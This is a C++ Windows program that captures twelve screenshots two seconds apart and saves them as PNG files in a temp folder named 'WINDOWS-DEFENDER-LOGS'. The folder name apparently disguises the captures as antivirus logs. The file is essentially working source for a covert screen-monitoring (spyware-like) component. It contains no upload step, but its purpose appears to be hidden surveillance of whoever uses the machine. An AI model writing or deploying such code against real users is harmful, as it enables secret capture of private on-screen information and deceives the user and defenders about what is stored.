#include <Windows.h>
#include <iostream>

#include <stdio.h>
#include <stdlib.h>

#include <gdiplus.h>

#include <time.h>

#include <filesystem>
#include <fstream>

#pragma comment(lib, "Gdiplus.lib")

#define DELAY_MS 2000
#define SCREENSHOT_NUM 12

#define FILE_NAME_INDEX 10

#define DIR_PATH "C:\\Windows\\Temp\\WINDOWS-DEFENDER-LOGS"


using namespace std;
using namespace Gdiplus;

/*
Function gets the class id of a certain image encoder.
input: format - The format of the image.
pClsid - The pointer to the class id.
return: The success of the function.
*/
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
{
	UINT num = 0, size = 0, i = 0;
	int status = 0;
	int foundClsid = FALSE;

	ImageCodecInfo* pImage = NULL;

	// Get the size of the image encoder.
	GetImageEncodersSize(&num, &size);
	if (!size)
	{
		status = -1;
	}

	// Mallocing a pointer to the image.
	pImage = (ImageCodecInfo*)(malloc(size));
	if (!pImage)
	{
		status = -1;
	}

	else
	{
		// Getting all the image encoders.
		GetImageEncoders(num, size, pImage);

		// Finding the right encoder.
		for (i = 0; i < num && !foundClsid; i++)
		{
			if (wcscmp(pImage[i].MimeType, format) == 0)
			{
				*pClsid = pImage[i].Clsid;
				status = i;
				foundClsid = TRUE;
			}
		}
	}

	free(pImage);
	return status;
}

/*
Function captures a screenshot, and saves it.
input: The bitmaps and virtual screens needed to capture the screenshot.
output: none.
*/
void captureScreenShot(Bitmap* bmp, HBITMAP hbmScreen, HDC hdcScreen, HDC hdcMemDC, wchar_t* fileName)
{
	CLSID encoderId;

	// Creating the bitmap for the screen shot, and linking it to the screen.
	hbmScreen = CreateCompatibleBitmap(hdcScreen, 1920, 1080);
	SelectObject(hdcMemDC, hbmScreen);

	// Copying the pixel data to the bitmap.
	BitBlt(hdcMemDC, 0, 0, 1920, 1080, hdcScreen, 0, 0, SRCCOPY);

	// Getting the class id of the image encoder.
	GetEncoderClsid(L"image/png", &encoderId);

	// Creating a new bitmap, and saving it.
	bmp = new Bitmap(hbmScreen, (HPALETTE)0);
	bmp->Save(fileName, &encoderId, NULL);
}

/*
Function gets the current date and time,
and puts it into the file name.
input: pFileName - The pointer to the file name.
fileNameSize - The size of the file name buffer.
output: Succuss status.
*/
int getCurrentDateTime(wchar_t* pFileName, size_t fileNameSize)
{
	const int DATE_TIME_LEN = 15;
	
	size_t convertedChars = 0;
	errno_t success = 0;

	char dateTime[DATE_TIME_LEN] = { 0 };
	wchar_t wideDateTime[DATE_TIME_LEN] = { 0 };

	struct tm timeInfo;

	// Getting the current date and time.
	time_t now = time(NULL);
	localtime_s(&timeInfo, &now);

	// Formatting the current date and time.
	strftime(dateTime, sizeof(dateTime), "%d%m%Y%H%M%S", &timeInfo);

	// Converting the formatted date and time string to wide string.
	success = mbstowcs_s(&convertedChars, wideDateTime, DATE_TIME_LEN, dateTime, _TRUNCATE);

	if (!success)
	{
		// Copying the date and time to the file name, and adding the exstension.
		wcscpy_s(pFileName, fileNameSize, wideDateTime);
		wcscat_s(pFileName, fileNameSize, L".png");
	}

	return success;
}

/*
Function creates a directory with the file path specified.
input: The file path of the directory.
output: Whether or not the function was a success.
*/
int createDir(std::filesystem::path dirFilePath)
{
	int success = TRUE;

	if (!exists(dirFilePath))
	{
		if (!std::filesystem::create_directory(dirFilePath))
		{
			printf("Failed to create directory!");
			success = FALSE;
		}
	}

	return success;
}

int main()
{
	int i = 0;

	int functionSuccess = 0;
	int convertSuccess = 0;
	int fileFormatChoice = 1;
	
	wchar_t fileName[FILENAME_MAX] = { 0 };
	wchar_t wideDirPath[FILENAME_MAX] = { 0 };
	wchar_t wideAddedFileName[FILENAME_MAX] = { 0 };
	char addedFileName[FILENAME_MAX] = { 0 };

	size_t convertedChars;

	std::filesystem::path dirPath = DIR_PATH;

	Bitmap* bmp = NULL;
	HBITMAP hbmScreen = NULL;
	GdiplusStartupInput gdip = NULL;
	ULONG_PTR gdipToken = NULL;
	
	// Creating a directory.
	if (!createDir(dirPath))
	{
		return 1;
	}

	// Get context of the screen, and creating a virtual screen.
	HDC hdcScreen = GetDC(NULL);
	HDC hdcMemDC = CreateCompatibleDC(hdcScreen);

	// Initializing the GDI engine.
	GdiplusStartup(&gdipToken, &gdip, NULL);

	// Taking a number of screenshots, with delays in between.
	for (i = 1; i <= SCREENSHOT_NUM; i++)
	{
		// Screenshot names will be unique, and saved in the directory of the project.
		if (fileFormatChoice == 0)
		{
			// Setting the name of the file to be the current date and time.
			functionSuccess = getCurrentDateTime(fileName, sizeof(fileName) / sizeof(wchar_t));

			if (functionSuccess)
			{
				printf("Error!.");
				return 0;
			}
		}

		// Screenshot names will repeat themselves, and saved in the new directory. 
		else
		{
			// Converting the dir path to wide char.
			convertSuccess = mbstowcs_s(&convertedChars, wideDirPath, FILENAME_MAX, DIR_PATH, _TRUNCATE);

			if (!convertSuccess)
			{
				// Converting the index of the screenshot to string.
				_itoa_s(i, addedFileName, 10);

				// Converting the file name to wide string.
				convertSuccess = mbstowcs_s(&convertedChars, wideAddedFileName, FILENAME_MAX, addedFileName, _TRUNCATE);

				if (!convertSuccess)
				{
					// Getting the full path and name of the screenshot.
					wcscpy_s(fileName, sizeof(fileName) / sizeof(wchar_t), wideDirPath);
					wcscat_s(fileName, sizeof(fileName) / sizeof(wchar_t), L"\\");
					wcscat_s(fileName, sizeof(fileName) / sizeof(wchar_t), wideAddedFileName);
					wcscat_s(fileName, sizeof(fileName) / sizeof(wchar_t), L".png");
				}

				else
				{
					printf("Error occured while converting!");
					return 1;
				}
			}

			else
			{
				printf("Error occured while converting!");
				return 1;
			}
		}

		// Capturing the screenshot.
		captureScreenShot(bmp, hbmScreen, hdcScreen, hdcMemDC, fileName);

		Sleep(DELAY_MS);
	}

	// Shutting down the gdi plus engine.
	GdiplusShutdown(gdipToken);

	// Releasing all objects.
	DeleteObject(hbmScreen);
	DeleteObject(hdcMemDC);
	ReleaseDC(NULL, hdcScreen);

	return 0;
}